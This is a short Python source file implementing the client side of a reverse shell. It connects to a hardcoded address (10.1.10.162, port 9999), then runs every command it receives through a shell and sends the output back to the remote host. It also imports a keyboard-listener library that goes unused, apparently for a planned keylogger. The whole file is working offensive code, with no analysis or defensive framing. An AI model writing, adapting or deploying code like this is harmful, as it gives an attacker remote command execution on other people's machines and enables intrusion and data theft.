import socket
from pynput.keyboard import Key, Listener
import subprocess
import os
import logging

#create client socket
def create_socket():
    try:
        global host
        global port
        global s
        host = "10.1.10.162"
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error:", str(msg))


    #Connect socket
def connect_socket():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
            print("Client Connection Error", str(msg))


#Receive Commands
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),
                                   shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + "> "))
    s.close()

def main():
    create_socket()
    connect_socket()
    receive_commands()


main()